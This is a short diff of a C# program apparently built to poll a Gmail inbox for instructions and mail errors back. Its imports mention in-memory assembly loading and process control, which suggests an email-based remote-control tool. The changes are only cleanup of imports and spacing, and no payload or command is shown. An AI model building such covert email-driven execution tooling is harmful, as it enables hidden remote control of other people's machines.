@@ -2,13 +2,11 @@
 using System.Threading;     // For using wait()
 using System.Net;           // For NetworkCredentials
 using System.Net.Mail;      // For mail operation
-using System.Reflection;    // For loading .NET assembly in-memory
 //using System.IO;            // For streamwriter
 using System.Text;          // For string operation
 //using System.Text.RegularExpressions; // For regular expression
 using System.Diagnostics;   // For process operation
 using System.Collections.Generic; // For List usage
-//using System.Threading;         // For threading implementation
 using EAGetMail;            // For Reading Gmail inboxes
 //using System.Management.Automation;
 //using System.Management.Automation.Runspaces;
@@ -206,7 +204,7 @@ namespace Gmail
                             strConcat = "";
                         }
                     }
-                    else if(Flag == 1)
+                    else if (Flag == 1)
                     {
                         //will sleep for "wait" secs...
                         //Console.WriteLine("Within Else if(Flag == 1)");
@@ -217,7 +215,7 @@ namespace Gmail
                 catch (MailServerException ex)
                 {
                     //Console.WriteLine("within catch");
-                    SendEmail("[!] Error caused: "+ex.ToString());
+                    SendEmail("[!] Error caused: " + ex.ToString());
                 }
             }
         }
